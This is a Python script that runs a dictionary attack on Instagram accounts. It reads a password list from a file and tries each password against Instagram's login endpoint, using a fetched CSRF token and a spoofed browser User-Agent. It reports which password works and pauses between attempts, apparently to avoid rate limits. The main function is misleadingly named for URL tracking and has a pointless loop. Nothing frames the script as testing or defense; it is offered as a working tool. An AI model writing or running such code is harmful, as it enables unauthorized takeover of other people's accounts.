import requests
import time
import os 
import sys 
import signal

def login(username, password):
    session = requests.Session()
    
    # Get initial CSRF token
    initial_response = session.get('https://www.instagram.com/')
    csrf_token = initial_response.cookies['csrftoken']
    
    # Login payload
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    
    # Headers for login
    headers = {
        'X-CSRFToken': csrf_token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://www.instagram.com/accounts/login/'
    }
    
    # Send POST request to login
    login_response = session.post('https://www.instagram.com/accounts/login/ajax/', data=payload, headers=headers)
    
    if login_response.status_code == 200 and login_response.json().get('authenticated'):
        return True
    else:
        return False

def signal_handler(sig, frame):
    sys.exit(0)
    
def track_url_change(username, password_file, target_url="https://www.instagram.com/"):
    signal.signal(signal.SIGINT, signal_handler) 
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        if login(username, password):
            print(f"Login successful with password: {password}")
            
            while True:
                session = requests.Session()
                response = session.get('https://www.instagram.com/')
                current_url = response.url
                
                return
        
        else:
            print(f"Login failed with password : {password}")
            time.sleep(3)  
    
    print("All passwords from the file have been tried. Exiting.")
